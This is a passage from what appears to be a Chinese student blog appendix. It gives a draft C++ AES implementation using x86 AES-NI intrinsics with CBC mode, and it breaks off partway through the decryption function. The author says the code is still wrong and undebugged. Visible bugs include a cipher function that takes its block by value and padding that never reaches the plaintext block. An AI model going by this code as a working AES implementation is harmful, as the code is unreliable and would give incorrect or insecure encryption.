附录</h1>\n<blockquote>\n<p>当时忙着一个写数据库的比赛（Mini OceanBase ）没来得及弄密码学了</p>\n</blockquote>\n<p>没来得及完全完成 x64 CPU 的 AES 指令集（AES-NI）实现 AES-256，实际上我在自己实现的时候就已开始想使用  <code>__m128i</code>  一步到位，然后发现这是思考题附加内容，并且使用 AES 指令是真的 “一步到位”，非常简单。所以我自己的实现只好退而求其次使用  <code>uint32_t</code>  和  <code>uint8_t</code>  来实现。</p>\n<p>已经初步写好，但好像还是错的，没来得及 debug 了，如下：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;cstdint&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;vector&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;algorithm&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdint.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;cstring&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;emmintrin.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;immintrin.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Number of columns (32-bit words) comprising the State. For this standard, Nb = 4</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> Nb 4</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Number of 32-bit words comprising the Cipher Key. For this standard, Nk = 4, 6, or 8</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> Nk 4</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Number of rounds, which is a function of Nk and Nb (which is fixed). For this standard, Nr = 10, 12, or 14</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> Nr 10</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> std;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">ecb_en</span><span class=\"params\">(__m128i &amp; KEY, <span class=\"type\">uint32_t</span> &amp; len)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">ecb_de</span><span class=\"params\">(__m128i &amp; KEY, <span class=\"type\">uint32_t</span> &amp; len)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">cbc_en</span><span class=\"params\">(__m128i &amp; KEY, __m128i &amp; IV, <span class=\"type\">uint32_t</span> &amp; len)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">cbc_de</span><span class=\"params\">(__m128i &amp; KEY, __m128i &amp; IV, <span class=\"type\">uint32_t</span> &amp; len)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">cfb_en</span><span class=\"params\">(__m128i &amp; KEY, __m128i &amp; IV, <span class=\"type\">uint32_t</span> &amp; len)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">cfb_de</span><span class=\"params\">(__m128i &amp; KEY, __m128i &amp; IV, <span class=\"type\">uint32_t</span> &amp; len)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">ofb_en</span><span class=\"params\">(__m128i &amp; KEY, __m128i &amp; IV, <span class=\"type\">uint32_t</span> &amp; len)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">ofb_de</span><span class=\"params\">(__m128i &amp; KEY, __m128i &amp; IV, <span class=\"type\">uint32_t</span> &amp; len)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">ctr_en</span><span class=\"params\">(__m128i &amp; KEY, __m128i &amp; IV, <span class=\"type\">uint32_t</span> &amp; len)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">ctr_de</span><span class=\"params\">(__m128i &amp; KEY, __m128i &amp; IV, <span class=\"type\">uint32_t</span> &amp; len)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">enum</span> <span class=\"title class_\">MODE</span> : <span class=\"type\">uint8_t</span> &#123;</span><br><span class=\"line\">    ECB_EN = <span class=\"number\">0x00</span>,</span><br><span class=\"line\">    ECB_DE = <span class=\"number\">0x80</span>,</span><br><span class=\"line\">    CBC_EN = <span class=\"number\">0x01</span>,</span><br><span class=\"line\">    CBC_DE = <span class=\"number\">0x81</span>,</span><br><span class=\"line\">    CFB_EN = <span class=\"number\">0x02</span>,</span><br><span class=\"line\">    CFB_DE = <span class=\"number\">0x82</span>,</span><br><span class=\"line\">    OFB_EN = <span class=\"number\">0x03</span>,</span><br><span class=\"line\">    OFB_DE = <span class=\"number\">0x83</span>,</span><br><span class=\"line\">    CTR_EN = <span class=\"number\">0x04</span>,</span><br><span class=\"line\">    CTR_DE = <span class=\"number\">0x84</span>,</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifndef</span> ONLINE_JUDGE</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;chrono&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;iomanip&gt;</span></span></span><br><span class=\"line\">FILE *output, *input;</span><br><span class=\"line\">chrono::time_point&lt;chrono::high_resolution_clock&gt; start_time, end_time;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">#<span class=\"keyword\">ifndef</span> ONLINE_JUDGE</span></span><br><span class=\"line\">    output = <span class=\"built_in\">freopen</span>(<span class=\"string\">&quot;output.bin&quot;</span>, <span class=\"string\">&quot;wb&quot;</span>, stdout);</span><br><span class=\"line\">    input = <span class=\"built_in\">freopen</span>(<span class=\"string\">&quot;input.bin&quot;</span>, <span class=\"string\">&quot;rb&quot;</span>, stdin);</span><br><span class=\"line\">    start_time = chrono::high_resolution_clock::<span class=\"built_in\">now</span>();</span><br><span class=\"line\">    <span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">uint8_t</span> mode;</span><br><span class=\"line\">    __m128i KEY;</span><br><span class=\"line\">    __m128i IV;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> len;</span><br><span class=\"line\">    <span class=\"built_in\">fread</span>(&amp;mode, <span class=\"built_in\">sizeof</span>(mode), <span class=\"number\">1</span>, stdin);</span><br><span class=\"line\">    <span class=\"built_in\">fread</span>(&amp;KEY, <span class=\"built_in\">sizeof</span>(KEY), <span class=\"number\">1</span>, stdin);</span><br><span class=\"line\">    <span class=\"built_in\">fread</span>(&amp;IV, <span class=\"built_in\">sizeof</span>(IV), <span class=\"number\">1</span>, stdin);</span><br><span class=\"line\">    <span class=\"built_in\">fread</span>(&amp;len, <span class=\"built_in\">sizeof</span>(len), <span class=\"number\">1</span>, stdin);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">switch</span>(mode)&#123;</span><br><span class=\"line\">        <span class=\"comment\">// case ECB_EN:&#123;ecb_en(KEY, len);&#125;break;</span></span><br><span class=\"line\">        <span class=\"comment\">// case ECB_DE:&#123;ecb_de(KEY, len);&#125;break;</span></span><br><span class=\"line\">        <span class=\"keyword\">case</span> CBC_EN:&#123;<span class=\"built_in\">cbc_en</span>(KEY, IV, len);&#125; <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> CBC_DE:&#123;<span class=\"built_in\">cbc_de</span>(KEY, IV, len);&#125; <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"comment\">// case CFB_EN:&#123;cfb_en(KEY, IV, len);&#125;break;</span></span><br><span class=\"line\">        <span class=\"comment\">// case CFB_DE:&#123;cfb_de(KEY, IV, len);&#125;break;</span></span><br><span class=\"line\">        <span class=\"comment\">// case OFB_EN:&#123;ofb_en(KEY, IV, len);&#125;break;</span></span><br><span class=\"line\">        <span class=\"comment\">// case OFB_DE:&#123;ofb_de(KEY, IV, len);&#125;break;</span></span><br><span class=\"line\">        <span class=\"comment\">// case CTR_EN:&#123;ctr_en(KEY, IV, len);&#125;break;</span></span><br><span class=\"line\">        <span class=\"comment\">// case CTR_DE:&#123;ctr_de(KEY, IV, len);&#125;break;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">#<span class=\"keyword\">ifndef</span> ONLINE_JUDGE</span></span><br><span class=\"line\">    <span class=\"built_in\">fclose</span>(input);</span><br><span class=\"line\">    <span class=\"built_in\">fclose</span>(output);</span><br><span class=\"line\">    output = <span class=\"built_in\">freopen</span>(<span class=\"string\">&quot;time&quot;</span>, <span class=\"string\">&quot;w&quot;</span>, stdout);</span><br><span class=\"line\">    end_time = chrono::high_resolution_clock::<span class=\"built_in\">now</span>();</span><br><span class=\"line\">    <span class=\"keyword\">auto</span> ns = chrono::<span class=\"built_in\">duration_cast</span>&lt;chrono::nanoseconds&gt;(end_time - start_time);</span><br><span class=\"line\">    <span class=\"keyword\">auto</span> us = chrono::<span class=\"built_in\">duration_cast</span>&lt;chrono::microseconds&gt;(end_time - start_time);</span><br><span class=\"line\">    <span class=\"keyword\">auto</span> ms = chrono::<span class=\"built_in\">duration_cast</span>&lt;chrono::milliseconds&gt;(end_time - start_time);</span><br><span class=\"line\">    cout &lt;&lt; ns.<span class=\"built_in\">count</span>() &lt;&lt; <span class=\"string\">&quot; ns\\n&quot;</span></span><br><span class=\"line\">         &lt;&lt; us.<span class=\"built_in\">count</span>() &lt;&lt; <span class=\"string\">&quot; us\\n&quot;</span></span><br><span class=\"line\">         &lt;&lt; ms.<span class=\"built_in\">count</span>() &lt;&lt; <span class=\"string\">&quot; ms&quot;</span>;</span><br><span class=\"line\">    <span class=\"built_in\">fclose</span>(output);</span><br><span class=\"line\">    <span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// uint32_t key[Nk] ---expand---&gt; __m128i w128[Nr+1]</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">KeyExpansion</span><span class=\"params\">(__m128i &amp; key, __m128i * w128, <span class=\"type\">bool</span> decrypting)</span></span>&#123;</span><br><span class=\"line\">    w128[<span class=\"number\">0</span>] = key;</span><br><span class=\"line\">    __m128i t, t2;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">#<span class=\"keyword\">define</span> EXPAND(n, RCON) \\</span></span><br><span class=\"line\"><span class=\"meta\">    t  = _mm_slli_si128(key, 4);\\</span></span><br><span class=\"line\"><span class=\"meta\">    t  = _mm_xor_si128(key, t);\\</span></span><br><span class=\"line\"><span class=\"meta\">    t2 = _mm_slli_si128(t, 8);\\</span></span><br><span class=\"line\"><span class=\"meta\">    t  = _mm_xor_si128(t, t2);\\</span></span><br><span class=\"line\"><span class=\"meta\">    key = _mm_aeskeygenassist_si128(key, RCON);\\</span></span><br><span class=\"line\"><span class=\"meta\">    key = _mm_shuffle_epi32(key, 0xFF);\\</span></span><br><span class=\"line\"><span class=\"meta\">    key = _mm_xor_si128(t, key);\\</span></span><br><span class=\"line\"><span class=\"meta\">    w128[n] = key;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">EXPAND</span>(<span class=\"number\">1</span>, <span class=\"number\">0x01</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Go on...</span></span><br><span class=\"line\">    <span class=\"built_in\">EXPAND</span>(<span class=\"number\">2</span>, <span class=\"number\">0x02</span>);</span><br><span class=\"line\">    <span class=\"built_in\">EXPAND</span>(<span class=\"number\">3</span>, <span class=\"number\">0x04</span>);</span><br><span class=\"line\">    <span class=\"built_in\">EXPAND</span>(<span class=\"number\">4</span>, <span class=\"number\">0x08</span>);</span><br><span class=\"line\">    <span class=\"built_in\">EXPAND</span>(<span class=\"number\">5</span>, <span class=\"number\">0x10</span>);</span><br><span class=\"line\">    <span class=\"built_in\">EXPAND</span>(<span class=\"number\">6</span>, <span class=\"number\">0x20</span>);</span><br><span class=\"line\">    <span class=\"built_in\">EXPAND</span>(<span class=\"number\">7</span>, <span class=\"number\">0x40</span>);</span><br><span class=\"line\">    <span class=\"built_in\">EXPAND</span>(<span class=\"number\">8</span>, <span class=\"number\">0x80</span>);</span><br><span class=\"line\">    <span class=\"built_in\">EXPAND</span>(<span class=\"number\">9</span>, <span class=\"number\">0x1b</span>);</span><br><span class=\"line\">    <span class=\"built_in\">EXPAND</span>(<span class=\"number\">10</span>, <span class=\"number\">0x36</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (decrypting) &#123;</span><br><span class=\"line\">        w128[<span class=\"number\">0</span>] = w128[<span class=\"number\">0</span>];</span><br><span class=\"line\">        w128[<span class=\"number\">1</span>] = _mm_aesimc_si128(w128[<span class=\"number\">1</span>]);</span><br><span class=\"line\">        w128[<span class=\"number\">2</span>] = _mm_aesimc_si128(w128[<span class=\"number\">2</span>]);</span><br><span class=\"line\">        w128[<span class=\"number\">3</span>] = _mm_aesimc_si128(w128[<span class=\"number\">3</span>]);</span><br><span class=\"line\">        w128[<span class=\"number\">4</span>] = _mm_aesimc_si128(w128[<span class=\"number\">4</span>]);</span><br><span class=\"line\">        w128[<span class=\"number\">5</span>] = _mm_aesimc_si128(w128[<span class=\"number\">5</span>]);</span><br><span class=\"line\">        w128[<span class=\"number\">6</span>] = _mm_aesimc_si128(w128[<span class=\"number\">6</span>]);</span><br><span class=\"line\">        w128[<span class=\"number\">7</span>] = _mm_aesimc_si128(w128[<span class=\"number\">7</span>]);</span><br><span class=\"line\">        w128[<span class=\"number\">8</span>] = _mm_aesimc_si128(w128[<span class=\"number\">8</span>]);</span><br><span class=\"line\">        w128[<span class=\"number\">9</span>] = _mm_aesimc_si128(w128[<span class=\"number\">9</span>]);</span><br><span class=\"line\">        w128[Nr] = w128[Nr];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Add 128-bit k to c</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"type\">void</span> <span class=\"title\">AddRoundKey</span><span class=\"params\">(__m128i &amp; c, __m128i &amp; k)</span></span>&#123;</span><br><span class=\"line\">    c = _mm_xor_si128(c, k);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// AES Cipher</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"type\">void</span> <span class=\"title\">Ciph</span><span class=\"params\">(__m128i c, __m128i * w128)</span></span>&#123;</span><br><span class=\"line\">    __m128i state = _mm_loadu_si128(&amp;c);</span><br><span class=\"line\">    state = _mm_xor_si128(state, w128[<span class=\"number\">0</span>]);</span><br><span class=\"line\">    state = _mm_aesenc_si128(state, w128[<span class=\"number\">1</span>]);</span><br><span class=\"line\">    state = _mm_aesenc_si128(state, w128[<span class=\"number\">2</span>]);</span><br><span class=\"line\">    state = _mm_aesenc_si128(state, w128[<span class=\"number\">3</span>]);</span><br><span class=\"line\">    state = _mm_aesenc_si128(state, w128[<span class=\"number\">4</span>]);</span><br><span class=\"line\">    state = _mm_aesenc_si128(state, w128[<span class=\"number\">5</span>]);</span><br><span class=\"line\">    state = _mm_aesenc_si128(state, w128[<span class=\"number\">6</span>]);</span><br><span class=\"line\">    state = _mm_aesenc_si128(state, w128[<span class=\"number\">7</span>]);</span><br><span class=\"line\">    state = _mm_aesenc_si128(state, w128[<span class=\"number\">8</span>]);</span><br><span class=\"line\">    state = _mm_aesenc_si128(state, w128[<span class=\"number\">9</span>]);</span><br><span class=\"line\">    state = _mm_aesenclast_si128(state, w128[Nr]);</span><br><span class=\"line\">    _mm_storeu_si128(<span class=\"built_in\">reinterpret_cast</span>&lt;__m128i *&gt;(&amp;c), state);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// AES Inverse Cipher</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"type\">void</span> <span class=\"title\">EqInvCiph</span><span class=\"params\">(__m128i &amp; c, __m128i * w128)</span></span>&#123;</span><br><span class=\"line\">    __m128i state = _mm_loadu_si128(&amp;c);</span><br><span class=\"line\">    state = _mm_xor_si128(state, w128[Nr]);</span><br><span class=\"line\">    state = _mm_aesdec_si128(state, w128[<span class=\"number\">9</span>]);</span><br><span class=\"line\">    state = _mm_aesdec_si128(state, w128[<span class=\"number\">8</span>]);</span><br><span class=\"line\">    state = _mm_aesdec_si128(state, w128[<span class=\"number\">7</span>]);</span><br><span class=\"line\">    state = _mm_aesdec_si128(state, w128[<span class=\"number\">6</span>]);</span><br><span class=\"line\">    state = _mm_aesdec_si128(state, w128[<span class=\"number\">5</span>]);</span><br><span class=\"line\">    state = _mm_aesdec_si128(state, w128[<span class=\"number\">4</span>]);</span><br><span class=\"line\">    state = _mm_aesdec_si128(state, w128[<span class=\"number\">3</span>]);</span><br><span class=\"line\">    state = _mm_aesdec_si128(state, w128[<span class=\"number\">2</span>]);</span><br><span class=\"line\">    state = _mm_aesdec_si128(state, w128[<span class=\"number\">1</span>]);</span><br><span class=\"line\">    state = _mm_aesdeclast_si128(state, w128[<span class=\"number\">0</span>]);</span><br><span class=\"line\">    _mm_storeu_si128(<span class=\"built_in\">reinterpret_cast</span>&lt;__m128i *&gt;(&amp;c), state);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// CBC mode encryption</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">cbc_en</span><span class=\"params\">(__m128i &amp; KEY, __m128i &amp; IV, <span class=\"type\">uint32_t</span> &amp; len)</span></span>&#123;</span><br><span class=\"line\">    __m128i p, c, w[Nr+<span class=\"number\">1</span>];</span><br><span class=\"line\">    <span class=\"type\">uint8_t</span> p_bytes[<span class=\"number\">16</span>];</span><br><span class=\"line\">    <span class=\"type\">uint8_t</span> c_bytes[<span class=\"number\">16</span>];</span><br><span class=\"line\">    c = IV;</span><br><span class=\"line\">    <span class=\"built_in\">KeyExpansion</span>(KEY, w, <span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(len &gt;= Nb * <span class=\"number\">4</span>)&#123;</span><br><span class=\"line\">        len -= Nb * <span class=\"number\">4</span>;</span><br><span class=\"line\">        <span class=\"built_in\">fread</span>(&amp;p, <span class=\"built_in\">sizeof</span>(p), <span class=\"number\">1</span>, stdin);</span><br><span class=\"line\">        <span class=\"built_in\">AddRoundKey</span>(c, p);</span><br><span class=\"line\">        <span class=\"built_in\">Ciph</span>(c, w);</span><br><span class=\"line\">        <span class=\"built_in\">fwrite</span>(&amp;c, <span class=\"built_in\">sizeof</span>(c), <span class=\"number\">1</span>, stdout);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">memset</span>(p_bytes + len, Nb * <span class=\"number\">4</span> - len, Nb * <span class=\"number\">4</span> - len);</span><br><span class=\"line\">    <span class=\"built_in\">fread</span>(&amp;p, <span class=\"built_in\">sizeof</span>(<span class=\"type\">uint8_t</span>), len, stdin);</span><br><span class=\"line\">    <span class=\"built_in\">AddRoundKey</span>(c, p);</span><br><span class=\"line\">    <span class=\"built_in\">Ciph</span>(c, w);</span><br><span class=\"line\">    <span class=\"built_in\">fwrite</span>(&amp;c, <span class=\"built_in\">sizeof</span>(c), <span class=\"number\">1</span>, stdout);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// CBC mode decryption, input must be multiple of 128 bits</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">cbc_de</span><span class=\"params\">(__m128i &amp; KEY, __m128i &amp; IV, <span class=\"type\">uint32_t</span> &amp; len)</span></span>&#123;</span><br><span class=\"line\">    __m128i p, c, last_c, w[Nr+<span class=\"number\">1</span>];</span><br><span class=\"line\">    <span class=\"type\">uint8_t</span> p_bytes[<span class=\"number\">16</span>];</span><br><span class=\"line\">    <span class=\"built_in\">memcpy</span>(&amp;last_c, &amp;IV, Nb * <span class=\"number\">4</span>);</span><br><span class=\"line\">    <span class=\"built_in\">KeyExpansion</span>(KEY, w, <span class=\"number\">1</span>);</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(len &gt; <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">        <span class=\"built_in\">fread</span>(&amp;c, <span class=\"built_in\">sizeof</span>(c), <span class=\"number\">1</span>, stdin);</span><br><span class=\"line\">        p = c;</span><br><span class=\"line\">        <span class=\"built_in\">EqInvCiph</span>(p, w);</span><br><span class=\"line\">        <span class=\"built_in\">AddRoundKey</span>(p, last_c);</span><br><span class=\"line\">        last_c = c;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(len == Nb * <span class=\"number\">4</span>)&#123;</span><br><span class=\"line\">            _mm_storeu_si128((__m128i*)p_bytes, p);</span><br><span class=\"line\">            <span class=\"type\">int</span> l = p_bytes[Nb * <span class=\"number\">4</span> - <span class=\"number\">1</span>];</span><br><span class=\"line\">            <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">1</span>; i &lt; l; ++i)&#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(p_bytes[Nb * <span class=\"number\">4</span> - <span 